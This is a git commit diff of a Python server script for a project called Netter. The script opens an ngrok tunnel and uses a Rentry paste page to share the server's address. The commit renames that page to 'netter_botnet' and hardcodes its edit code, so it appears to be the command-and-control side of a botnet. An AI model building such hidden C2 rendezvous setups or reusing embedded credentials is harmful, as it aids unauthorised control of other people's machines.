23b4bec23ff66afe8996cdad97f85e5249685e5f
LeftandRight <leftandright.x@gmail.com>
2025-02-21 19:20:27 +0800

    dunno

--- server.py
+++ server.py
@@ -1,37 +1,39 @@
 from core.rentry import Rentry
 from core.http import NetterServer
 from pyngrok import ngrok
+from secrets import token_urlsafe
+from loguru import logger
 
 import json
 
+
 # def main():
-#     ngrokConfig = ngrok.PyngrokConfig(auth_token = json.load(open('config.json'))['ngrokAuthToken'])
-#     netterServer: NetterServer = NetterServer(ngrokConfig = ngrokConfig)
+#     ngrokConfig = ngrok.PyngrokConfig(auth_token=json.load(open("config.json"))["ngrokAuthToken"])
+#     netterServer: NetterServer = NetterServer(ngrokConfig=ngrokConfig)
 
-#     Create a new Rentry url with the same edit code as the url name
-#     url: str = Rentry.new((uname := token_urlsafe(16)), text = 'blank', edit_code = uname ); \
-#         logger.info('Rentry server url created with url name ' + uname)
+#     # Create a new Rentry url with the same edit code as the url name
+#     url: str = Rentry.new((uname := token_urlsafe(16)), text="blank", edit_code=uname)
+#     netterServer.console_log("Rentry server url created with url name " + uname)
 
-#     netterServer.rentryUrlName = uname # Connect to your newly created rentry server
-
-#     netterServer.startNgrokTunnel(useRentry = True, rentryEditCode = uname)
+#     netterServer.rentryUrlName = uname  # Connect to your newly created rentry server
+#     netterServer.rentryEditCode = uname
+#     netterServer.startNgrokTunnel(useRentry=True)
 #     netterServer.listen()
 
 #     Rentry.delete(uname, uname)
 
 
 def main():
-    ngrokConfig = ngrok.PyngrokConfig(
-        auth_token = json.load(open('config.json'))['ngrokAuthToken']
-    )
+    ngrokConfig = ngrok.PyngrokConfig(auth_token=json.load(open("config.json"))["ngrokAuthToken"])
 
-    netterServer: NetterServer = NetterServer(ngrokConfig = ngrokConfig)
+    netterServer: NetterServer = NetterServer(ngrokConfig=ngrokConfig)
 
-    netterServer.rentryUrlName = 'netter_testing'
-    netterServer.rentryEditCode = 'netter_testing'
+    netterServer.rentryUrlName = "netter_botnet"
+    netterServer.rentryEditCode = "924450817Gg"
 
-    # netterServer.startNgrokTunnel(useRentry = True)
+    # netterServer.startNgrokTunnel(useRentry=True)
     netterServer.listen()
+
 
 if __name__ == "__main__":
     main()
